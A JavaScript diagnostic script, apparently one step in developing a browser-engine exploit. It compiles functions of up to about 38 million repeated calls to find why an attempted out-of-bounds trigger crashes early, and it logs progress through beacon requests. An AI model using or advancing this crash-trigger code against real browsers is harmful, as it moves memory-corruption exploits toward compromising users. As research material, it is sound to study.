// p198 — Diagnostic: WHY does the function call crash immediately?
// p196/p197 both crash on CALL-START without reaching CB-100.
// This means the crash isn't from OOB metadata — it's earlier.
//
// Tests:
// A: Small function (1000 calls) — does op_call work at all?
// B: Medium function (100K calls) — is there a size limit?
// C: Large function (1M calls) — approaching the boundary
// D: Try calling with no callback (undefined) — crash from metadata or from call?
// E: The full 38M function — with immediate-beacon callback
//
// Beacon prefix: V198-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V198-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  B('BOOT');

  // Test A: 1000 calls
  try {
    var srcA = 'window.__tA=function(a){' + 'a();'.repeat(1000) + '};';
    eval(srcA);
    B('A-COMPILED');
    var countA = 0;
    window.__tA(function() { countA++; });
    B('A-OK-' + countA);
  } catch (e) {
    B('A-ERR-' + (e.message || '').substring(0, 30));
  }

  // Test B: 100K calls
  try {
    var srcB = 'window.__tB=function(a){' + 'a();'.repeat(100000) + '};';
    eval(srcB);
    B('B-COMPILED');
    var countB = 0;
    window.__tB(function() { countB++; });
    B('B-OK-' + countB);
  } catch (e) {
    B('B-ERR-' + (e.message || '').substring(0, 30));
  }

  // Test C: 1M calls — use blob to avoid eval memory issues
  try {
    var blobC = new Blob([
      'window.__tC=function(a){' + 'a();'.repeat(1000000) + '};window.__tCok=1;'
    ], { type: 'application/javascript' });
    B('C-BLOB-' + Math.round(blobC.size / 1024) + 'KB');
    var urlC = URL.createObjectURL(blobC);
    var scC = document.createElement('script');
    scC.onload = function() {
      B('C-COMPILED');
      var countC = 0;
      try {
        window.__tC(function() { countC++; });
        B('C-OK-' + countC);
      } catch (e) {
        B('C-ERR-' + countC + '-' + (e.message || '').substring(0, 30));
      }
      testD();
    };
    scC.onerror = function() { B('C-SCRIPT-ERR'); testD(); };
    document.head.appendChild(scC);
    scC.src = urlC;
  } catch (e) {
    B('C-OUTER-ERR');
    testD();
  }

  function testD() {
    // Test D: 10M calls
    try {
      var CHUNK = 1000000;
      var parts = ['window.__tD=function(a){'];
      for (var i = 0; i < 10; i++) parts.push('a();'.repeat(CHUNK));
      parts.push('};window.__tDok=1;');
      var blobD = new Blob(parts, { type: 'application/javascript' });
      B('D-BLOB-' + Math.round(blobD.size / 1048576) + 'MB');
      parts = null;
      var urlD = URL.createObjectURL(blobD);
      var scD = document.createElement('script');
      scD.onload = function() {
        B('D-COMPILED');
        var countD = 0;
        try {
          window.__tD(function() {
            countD++;
            if (countD === 1) B('D-CB-1');
            if (countD === 1000) B('D-CB-1K');
            if (countD === 10000) B('D-CB-10K');
            if (countD === 100000) B('D-CB-100K');
            if (countD === 1000000) B('D-CB-1M');
            if (countD === 5000000) B('D-CB-5M');
            if (countD === 10000000) B('D-CB-10M');
          });
          B('D-OK-' + countD);
        } catch (e) {
          B('D-ERR-' + countD);
        }
        testE();
      };
      scD.onerror = function() { B('D-SCRIPT-ERR'); testE(); };
      document.head.appendChild(scD);
      scD.src = urlD;
    } catch (e) {
      B('D-OUTER-ERR');
      testE();
    }
  }

  function testE() {
    // Test E: Full 38M — just try CB-1
    var N = 38348816;
    var CHUNK = 4000000;
    var chunksN = Math.floor(N / CHUNK);
    var rem = N - chunksN * CHUNK;
    var callChunk = 'a();'.repeat(CHUNK);
    var parts = new Array(chunksN + 3);
    parts[0] = 'window.__tE=function(a){';
    for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
    parts[chunksN + 1] = 'a();'.repeat(rem);
    parts[chunksN + 2] = '};window.__tEok=1;';
    callChunk = null;
    var blob = new Blob(parts, { type: 'application/javascript' });
    B('E-BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('E-COMPILED');
      var countE = 0;
      try {
        window.__tE(function() {
          countE++;
          if (countE === 1) B('E-CB-1');
          if (countE === 10) B('E-CB-10');
          if (countE === 100) B('E-CB-100');
          if (countE > 1000) throw 'STOP';
        });
        B('E-OK-' + countE);
      } catch (e) {
        B('E-THREW-' + countE);
      }
    };
    sc.onerror = function() { B('E-SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
